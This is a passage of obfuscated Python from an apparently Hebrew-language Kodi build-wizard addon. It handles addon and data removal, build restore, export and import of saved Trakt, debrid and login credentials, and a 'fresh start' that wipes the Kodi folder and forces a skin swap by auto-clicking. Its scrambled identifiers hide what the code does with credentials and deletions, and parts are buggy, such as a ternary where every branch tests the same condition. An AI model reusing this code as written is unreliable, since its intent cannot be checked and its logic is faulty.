					OO0OO0OOO0OOO0OOO .getControl (OO0OO0OOO0OOO0OOO .msg ).setText ("Log File Does Not Exists!")#line:4617
				else :#line:4618
					OO0OO0OOO0OOO0OOO .titlemsg ="%s: %s"%(ADDONTITLE ,O00O0O0O00000O0OO .replace (ADDONDATA ,''))#line:4619
					OO0OO0OOO0OOO0OOO .getControl (OO0OO0OOO0OOO0OOO .title ).setLabel (OO0OO0OOO0OOO0OOO .titlemsg )#line:4620
					OO0OO0OOO0OOO0OOO .getControl (OO0OO0OOO0OOO0OOO .msg ).setText (wiz .highlightText (OOOOO000OOO00OO0O ))#line:4621
					OO0OO0OOO0OOO0OOO .setFocusId (OO0OO0OOO0OOO0OOO .scrollbar )#line:4622
		def onAction (OO000O0000O00O0O0 ,O0OO0O000O00OO0OO ):#line:4624
			if O0OO0O000O00OO0OO ==ACTION_PREVIOUS_MENU :OO000O0000O00O0O0 .close ()#line:4625
			elif O0OO0O000O00OO0OO ==ACTION_NAV_BACK :OO000O0000O00O0O0 .close ()#line:4626
	if default ==None :default =wiz .Grab_Log (True )#line:4627
	OO000000OOO0OOO0O =O00O0O0OO0OO00O00 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4628
	OO000000OOO0OOO0O .doModal ()#line:4629
	del OO000000OOO0OOO0O #line:4630
def removeAddon (OOOO000O0OO0OOO0O ,O0OOOO0O00OOO0OOO ,over =False ):#line:4632
	if not over ==False :#line:4633
		O0O0O00OOOO00OOOO =1 #line:4634
	else :#line:4635
		O0O0O00OOOO00OOOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OOOO0O00OOO0OOO ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OOOO000O0OO0OOO0O ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4636
	if O0O0O00OOOO00OOOO ==1 :#line:4637
		O00OO00O0OOOOOO0O =os .path .join (ADDONS ,OOOO000O0OO0OOO0O )#line:4638
		wiz .log ("Removing Addon %s"%OOOO000O0OO0OOO0O )#line:4639
		wiz .cleanHouse (O00OO00O0OOOOOO0O )#line:4640
		xbmc .sleep (1000 )#line:4641
		try :shutil .rmtree (O00OO00O0OOOOOO0O )#line:4642
		except Exception as OOOOO0O0O0O0000OO :wiz .log ("Error removing %s"%OOOO000O0OO0OOO0O ,xbmc .LOGNOTICE )#line:4643
		removeAddonData (OOOO000O0OO0OOO0O ,O0OOOO0O00OOO0OOO ,over )#line:4644
	if over ==False :#line:4645
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O0OOOO0O00OOO0OOO ))#line:4646
def removeAddonData (OOO000OOOOO0O00O0 ,name =None ,over =False ):#line:4648
	if OOO000OOOOO0O00O0 =='all':#line:4649
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4650
			wiz .cleanHouse (ADDOND )#line:4651
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4652
	elif OOO000OOOOO0O00O0 =='uninstalled':#line:4653
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4654
			OOOO000OOOO0O0OOO =0 #line:4655
			for OO0OO00OO0O000OO0 in glob .glob (os .path .join (ADDOND ,'*')):#line:4656
				O00O000000OO00OOO =OO0OO00OO0O000OO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4657
				if O00O000000OO00OOO in EXCLUDES :pass #line:4658
				elif os .path .exists (os .path .join (ADDONS ,O00O000000OO00OOO )):pass #line:4659
				else :wiz .cleanHouse (OO0OO00OO0O000OO0 );OOOO000OOOO0O0OOO +=1 ;wiz .log (OO0OO00OO0O000OO0 );shutil .rmtree (OO0OO00OO0O000OO0 )#line:4660
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOOO000OOOO0O0OOO ))#line:4661
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4662
	elif OOO000OOOOO0O00O0 =='empty':#line:4663
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4664
			OOOO000OOOO0O0OOO =wiz .emptyfolder (ADDOND )#line:4665
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOOO000OOOO0O0OOO ))#line:4666
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4667
	else :#line:4668
		OO00000O0000O00O0 =os .path .join (USERDATA ,'addon_data',OOO000OOOOO0O00O0 )#line:4669
		if OOO000OOOOO0O00O0 in EXCLUDES :#line:4670
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4671
		elif os .path .exists (OO00000O0000O00O0 ):#line:4672
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO000OOOOO0O00O0 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4673
				wiz .cleanHouse (OO00000O0000O00O0 )#line:4674
				try :#line:4675
					shutil .rmtree (OO00000O0000O00O0 )#line:4676
				except :#line:4677
					wiz .log ("Error deleting: %s"%OO00000O0000O00O0 )#line:4678
			else :#line:4679
				wiz .log ('Addon data for %s was not removed'%OOO000OOOOO0O00O0 )#line:4680
	wiz .refresh ()#line:4681
def restoreit (O00O0OOO00000O00O ):#line:4683
	if O00O0OOO00000O00O =='build':#line:4684
		OO0000O0O000O00O0 =freshStart ('restore')#line:4685
		if OO0000O0O000O00O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4686
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4687
		wiz .skinToDefault ()#line:4688
	wiz .restoreLocal (O00O0OOO00000O00O )#line:4689
def restoreextit (OO00O00O0O0OO0OO0 ):#line:4691
	if OO00O00O0O0OO0OO0 =='build':#line:4692
		O0OOO0O000OO000O0 =freshStart ('restore')#line:4693
		if O0OOO0O000OO000O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4694
	wiz .restoreExternal (OO00O00O0O0OO0OO0 )#line:4695
def buildInfo (OOO0OO0OOOO0O0O00 ):#line:4697
	if wiz .workingURL (SPEEDFILE )==True :#line:4698
		if wiz .checkBuild (OOO0OO0OOOO0O0O00 ,'url'):#line:4699
			OOO0OO0OOOO0O0O00 ,O0OO0O0000O0000OO ,O00O0OOO00000O000 ,O0O0000O000OO0000 ,OO000OOO00O00O000 ,O0OO0000OOOO0OO00 ,O0000O0O0OO0O0OO0 ,O0OOOO0O00OOOOOO0 ,O00OOOOOOO00O0O0O ,OO0OO0OOO0000O000 ,O00OOO0OO0OOO0OO0 =wiz .checkBuild (OOO0OO0OOOO0O0O00 ,'all')#line:4700
			OO0OO0OOO0000O000 ='Yes'if OO0OO0OOO0000O000 .lower ()=='yes'else 'No'#line:4701
			O0OO0O00OOO0O0O00 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0OO0OOOO0O0O00 )#line:4702
			O0OO0O00OOO0O0O00 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO0O0000O0000OO )#line:4703
			if not O0OO0000OOOO0OO00 =="http://":#line:4704
				OO0O0O00000O0OOO0 =wiz .themeCount (OOO0OO0OOOO0O0O00 ,False )#line:4705
				O0OO0O00OOO0O0O00 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OO0O0O00000O0OOO0 ))#line:4706
			O0OO0O00OOO0O0O00 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO000OOO00O00O000 )#line:4707
			O0OO0O00OOO0O0O00 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0OO0OOO0000O000 )#line:4708
			O0OO0O00OOO0O0O00 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00OOO0OO0OOO0OO0 )#line:4709
			wiz .TextBox (ADDONTITLE ,O0OO0O00OOO0O0O00 )#line:4710
		else :wiz .log ("Invalid Build Name!")#line:4711
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4712
def buildVideo (O0O0OO0O00O0OOOOO ):#line:4714
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4715
	if wiz .workingURL (SPEEDFILE )==True :#line:4716
		O0O0O0O0O00OO0OOO =wiz .checkBuild (O0O0OO0O00O0OOOOO ,'preview')#line:4717
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O0O0OO0O00O0OOOOO )#line:4718
		if O0O0O0O0O00OO0OOO and not O0O0O0O0O00OO0OOO =='http://':playVideo (O0O0O0O0O00OO0OOO )#line:4719
		else :wiz .log ("[%s]Unable to find url for video preview"%O0O0OO0O00O0OOOOO )#line:4720
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4721
def dependsList (O0OO0OOO00O0OOOOO ):#line:4723
	OO00OO0O0O0O0OOO0 =os .path .join (ADDONS ,O0OO0OOO00O0OOOOO ,'addon.xml')#line:4724
	if os .path .exists (OO00OO0O0O0O0OOO0 ):#line:4725
		OO000O0OOOOOO0OOO =open (OO00OO0O0O0O0OOO0 ,mode ='r');O0O0OO0OO000OOO00 =OO000O0OOOOOO0OOO .read ();OO000O0OOOOOO0OOO .close ();#line:4726
		O0O00000OO0O0OO0O =wiz .parseDOM (O0O0OO0OO000OOO00 ,'import',ret ='addon')#line:4727
		OOOO0000OO00OO00O =[]#line:4728
		for OO000000O00000O00 in O0O00000OO0O0OO0O :#line:4729
			if not 'xbmc.python'in OO000000O00000O00 :#line:4730
				OOOO0000OO00OO00O .append (OO000000O00000O00 )#line:4731
		return OOOO0000OO00OO00O #line:4732
	return []#line:4733
def manageSaveData (O0000O0OO0OO0OOO0 ):#line:4735
	if O0000O0OO0OO0OOO0 =='import':#line:4736
		OO00000000OOO0OOO =os .path .join (ADDONDATA ,'temp')#line:4737
		if not os .path .exists (OO00000000OOO0OOO ):os .makedirs (OO00000000OOO0OOO )#line:4738
		OO0O0O0O0OO0OO0OO =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4739
		if not OO0O0O0O0OO0OO0OO .endswith ('.zip'):#line:4740
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4741
			return #line:4742
		OO00O00O0OO0O00O0 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4743
		OOO000OOO00OOO0OO =xbmcvfs .copy (OO0O0O0O0OO0OO0OO ,OO00O00O0OO0O00O0 )#line:4744
		wiz .log ("%s"%str (OOO000OOO00OOO0OO ))#line:4745
		extract .all (xbmc .translatePath (OO00O00O0OO0O00O0 ),OO00000000OOO0OOO )#line:4746
		O0000OOOOOO00OO0O =os .path .join (OO00000000OOO0OOO ,'trakt')#line:4747
		O0OOO0O0O0O00O00O =os .path .join (OO00000000OOO0OOO ,'login')#line:4748
		OO0O0O0OOO00OO000 =os .path .join (OO00000000OOO0OOO ,'debrid')#line:4749
		O0OO0OOO0OO000OOO =0 #line:4750
		if os .path .exists (O0000OOOOOO00OO0O ):#line:4751
			O0OO0OOO0OO000OOO +=1 #line:4752
			O0O0OO000OOO0000O =os .listdir (O0000OOOOOO00OO0O )#line:4753
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4754
			for O00O00OO00O00O000 in O0O0OO000OOO0000O :#line:4755
				OOOO000O00000OO00 =os .path .join (traktit .TRAKTFOLD ,O00O00OO00O00O000 )#line:4756
				OO0OO000O0O0OO0OO =os .path .join (O0000OOOOOO00OO0O ,O00O00OO00O00O000 )#line:4757
				if os .path .exists (OOOO000O00000OO00 ):#line:4758
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O00OO00O00O000 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4759
					else :os .remove (OOOO000O00000OO00 )#line:4760
				shutil .copy (OO0OO000O0O0OO0OO ,OOOO000O00000OO00 )#line:4761
			traktit .importlist ('all')#line:4762
			traktit .traktIt ('restore','all')#line:4763
		if os .path .exists (O0OOO0O0O0O00O00O ):#line:4764
			O0OO0OOO0OO000OOO +=1 #line:4765
			O0O0OO000OOO0000O =os .listdir (O0OOO0O0O0O00O00O )#line:4766
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4767
			for O00O00OO00O00O000 in O0O0OO000OOO0000O :#line:4768
				OOOO000O00000OO00 =os .path .join (loginit .LOGINFOLD ,O00O00OO00O00O000 )#line:4769
				OO0OO000O0O0OO0OO =os .path .join (O0OOO0O0O0O00O00O ,O00O00OO00O00O000 )#line:4770
				if os .path .exists (OOOO000O00000OO00 ):#line:4771
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O00OO00O00O000 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4772
					else :os .remove (OOOO000O00000OO00 )#line:4773
				shutil .copy (OO0OO000O0O0OO0OO ,OOOO000O00000OO00 )#line:4774
			loginit .importlist ('all')#line:4775
			loginit .loginIt ('restore','all')#line:4776
		if os .path .exists (OO0O0O0OOO00OO000 ):#line:4777
			O0OO0OOO0OO000OOO +=1 #line:4778
			O0O0OO000OOO0000O =os .listdir (OO0O0O0OOO00OO000 )#line:4779
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4780
			for O00O00OO00O00O000 in O0O0OO000OOO0000O :#line:4781
				OOOO000O00000OO00 =os .path .join (debridit .REALFOLD ,O00O00OO00O00O000 )#line:4782
				OO0OO000O0O0OO0OO =os .path .join (OO0O0O0OOO00OO000 ,O00O00OO00O00O000 )#line:4783
				if os .path .exists (OOOO000O00000OO00 ):#line:4784
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O00OO00O00O000 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4785
					else :os .remove (OOOO000O00000OO00 )#line:4786
				shutil .copy (OO0OO000O0O0OO0OO ,OOOO000O00000OO00 )#line:4787
			debridit .importlist ('all')#line:4788
			debridit .debridIt ('restore','all')#line:4789
		wiz .cleanHouse (OO00000000OOO0OOO )#line:4790
		wiz .removeFolder (OO00000000OOO0OOO )#line:4791
		os .remove (OO00O00O0OO0O00O0 )#line:4792
		if O0OO0OOO0OO000OOO ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4793
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4794
	elif O0000O0OO0OO0OOO0 =='export':#line:4795
		OO00O000O0000O00O =xbmc .translatePath (MYBUILDS )#line:4796
		OO000OOOO0OOOOO0O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4797
		traktit .traktIt ('update','all')#line:4798
		loginit .loginIt ('update','all')#line:4799
		debridit .debridIt ('update','all')#line:4800
		OO0O0O0O0OO0OO0OO =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4801
		OO0O0O0O0OO0OO0OO =xbmc .translatePath (OO0O0O0O0OO0OO0OO )#line:4802
		O0000O0000OO00O0O =os .path .join (OO00O000O0000O00O ,'SaveData.zip')#line:4803
		OOOOO0OOO00O00000 =zipfile .ZipFile (O0000O0000OO00O0O ,mode ='w')#line:4804
		for OO00OO0O00O0O00O0 in OO000OOOO0OOOOO0O :#line:4805
			if os .path .exists (OO00OO0O00O0O00O0 ):#line:4806
				O0O0OO000OOO0000O =os .listdir (OO00OO0O00O0O00O0 )#line:4807
				for OO0O0O0OO0000O000 in O0O0OO000OOO0000O :#line:4808
					OOOOO0OOO00O00000 .write (os .path .join (OO00OO0O00O0O00O0 ,OO0O0O0OO0000O000 ),os .path .join (OO00OO0O00O0O00O0 ,OO0O0O0OO0000O000 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4809
		OOOOO0OOO00O00000 .close ()#line:4810
		if OO0O0O0O0OO0OO0OO ==OO00O000O0000O00O :#line:4811
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O0000OO00O0O ))#line:4812
		else :#line:4813
			try :#line:4814
				xbmcvfs .copy (O0000O0000OO00O0O ,os .path .join (OO0O0O0O0OO0OO0OO ,'SaveData.zip'))#line:4815
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OO0O0O0O0OO0OO0OO ,'SaveData.zip')))#line:4816
			except :#line:4817
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O0000OO00O0O ))#line:4818
def freshStart (install =None ,over =False ):#line:4823
	if USERNAME =='':#line:4824
		ADDON .openSettings ()#line:4825
		sys .exit ()#line:4826
	OOOO000O0OO0O0000 =(SPEEDFILE )#line:4827
	(OOOO000O0OO0O0000 )#line:4828
	OOO0OO00O0OOO000O =(wiz .workingURL (OOOO000O0OO0O0000 ))#line:4829
	(OOO0OO00O0OOO000O )#line:4830
	if KEEPTRAKT =='true':#line:4831
		traktit .autoUpdate ('all')#line:4832
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4833
	if KEEPREAL =='true':#line:4834
		debridit .autoUpdate ('all')#line:4835
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4836
	if KEEPLOGIN =='true':#line:4837
		loginit .autoUpdate ('all')#line:4838
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4839
	if over ==True :OO000OO00O0OO00OO =1 #line:4840
	elif install =='restore':OO000OO00O0OO00OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4841
	elif install :OO000OO00O0OO00OO =1 #line:4842
	else :OO000OO00O0OO00OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4843
	if OO000OO00O0OO00OO :#line:4844
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4845
			O0O0O00000OOO0000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4846
			skinSwitch .swapSkins (O0O0O00000OOO0000 )#line:4849
			O0O0OOO0OOOOO0O00 =0 #line:4850
			xbmc .sleep (1000 )#line:4851
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0OOO0OOOOO0O00 <150 :#line:4852
				O0O0OOO0OOOOO0O00 +=1 #line:4853
				xbmc .sleep (1000 )#line:4854
				wiz .ebi ('SendAction(Select)')#line:4855
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4856
				wiz .ebi ('SendClick(11)')#line:4857
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4858
			xbmc .sleep (1000 )#line:4859
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4860
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4861
			return #line:4862
		wiz .addonUpdates ('set')#line:4863
		O00OOOO00OOOO000O =os .path .abspath (HOME )#line:4864
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4865
		OOO00O0OOOO00OO00 =sum ([len (O0OO000O00O00OO0O )for OO0O0OOO000O00OO0 ,O000OO0000OO0OOO0 ,O0OO000O00O00OO0O in os .walk (O00OOOO00OOOO000O )]);O0000OO000OOO00O0 =0 #line:4866
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4867
		EXCLUDES .append ('My_Builds')#line:4868
		EXCLUDES .append ('archive_cache')#line:4869
		EXCLUDES .append ('script.module.requests')#line:4870
		EXCLUDES .append ('myfav.anon')#line:4871
		if KEEPREPOS =='true':#line:4872
			OOO00OOO0O0O00O00 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4873
			for O0O000O0O0OO00000 in OOO00OOO0O0O00O00 :#line:4874
				O0OO00000OO00OO0O =os .path .split (O0O000O0O0OO00000 [:-1 ])[1 ]#line:4875
				if not O0OO00000OO00OO0O ==EXCLUDES :#line:4876
					EXCLUDES .append (O0OO00000OO00OO0O )#line:4877
		if KEEPSUPER =='true':#line:4878
			EXCLUDES .append ('plugin.program.super.favourites')#line:4879
		if KEEPMOVIELIST =='true':#line:4880
			EXCLUDES .append ('plugin.video.metalliq')#line:4881
		if KEEPMOVIELIST =='true':#line:4882
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4883
		if KEEPADDONS =='true':#line:4884
			EXCLUDES .append ('addons')#line:4885
		if KEEPTELEMEDIA =='true':#line:4886
			EXCLUDES .append ('plugin.video.telemedia')#line:4887
		EXCLUDES .append ('plugin.video.elementum')#line:4892
		EXCLUDES .append ('script.elementum.burst')#line:4893
		EXCLUDES .append ('script.elementum.burst-master')#line:4894
		EXCLUDES .append ('plugin.video.quasar')#line:4895
		EXCLUDES .append ('script.quasar.burst')#line:4896
		EXCLUDES .append ('skin.estuary')#line:4897
		if KEEPWHITELIST =='true':#line:4900
			OOO0O0OO0O0OOO000 =''#line:4901
			OO00OO0O00OOO0O0O =wiz .whiteList ('read')#line:4902
			if len (OO00OO0O00OOO0O0O )>0 :#line:4903
				for O0O000O0O0OO00000 in OO00OO0O00OOO0O0O :#line:4904
					try :OO00O0O00OOO00OO0 ,OOO0OOO000000OOO0 ,O0O0000O00OOO0O00 =O0O000O0O0OO00000 #line:4905
					except :pass #line:4906
					if O0O0000O00OOO0O00 .startswith ('pvr'):OOO0O0OO0O0OOO000 =OOO0OOO000000OOO0 #line:4907
					O00OOOO0O0OOOO0O0 =dependsList (O0O0000O00OOO0O00 )#line:4908
					for OOO0OOO0O0O0OO0O0 in O00OOOO0O0OOOO0O0 :#line:4909
						if not OOO0OOO0O0O0OO0O0 in EXCLUDES :#line:4910
							EXCLUDES .append (OOO0OOO0O0O0OO0O0 )#line:4911
						OOOO0OO0O0000O000 =dependsList (OOO0OOO0O0O0OO0O0 )#line:4912
						for O0OOOO0OOOOO0OO00 in OOOO0OO0O0000O000 :#line:4913
							if not O0OOOO0OOOOO0OO00 in EXCLUDES :#line:4914
								EXCLUDES .append (O0OOOO0OOOOO0OO00 )#line:4915
					if not O0O0000O00OOO0O00 in EXCLUDES :#line:4916
						EXCLUDES .append (O0O0000O00OOO0O00 )#line:4917
				if not OOO0O0OO0O0OOO000 =='':wiz .setS ('pvrclient',O0O0000O00OOO0O00 )#line:4918
		if wiz .getS ('pvrclient')=='':#line:4919
			for O0O000O0O0OO00000 in EXCLUDES :#line:4920
				if O0O000O0O0OO00000 .startswith ('pvr'):#line:4921
					wiz .setS ('pvrclient',O0O000O0O0OO00000 )#line:4922
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4923
		O0O0OO0000OOO000O =wiz .latestDB ('Addons')#line:4924
		for OOO00O00OOOO00OO0 ,OO0000000O00OO0OO ,O000OOOOOO00O00O0 in os .walk (O00OOOO00OOOO000O ,topdown =True ):#line:4925
			OO0000000O00OO0OO [:]=[O0O0OOO0OO000O0OO for O0O0OOO0OO000O0OO in OO0000000O00OO0OO if O0O0OOO0OO000O0OO not in EXCLUDES ]#line:4926
			for OO00O0O00OOO00OO0 in O000OOOOOO00O00O0 :#line:4927
				O0000OO000OOO00O0 +=1 #line:4928
				O0O0000O00OOO0O00 =OOO00O00OOOO00OO0 .replace ('/','\\').split ('\\')#line:4929
				O0O0OOO0OOOOO0O00 =len (O0O0000O00OOO0O00 )-1 #line:4931
				if O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -2 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4932
				elif OO00O0O00OOO00OO0 =='MyVideos99.db'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4933
				elif OO00O0O00OOO00OO0 =='MyVideos107.db'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4934
				elif OO00O0O00OOO00OO0 =='MyVideos116.db'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -1 ]=='userdata'and O0O0000O00OOO0O00 [O0O0OOO0OOOOO0O00 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO00O00OOOO00OO0 ,OO00O0O00OOO00OO0 ),xbmc .LOGNOTICE )#line:4935
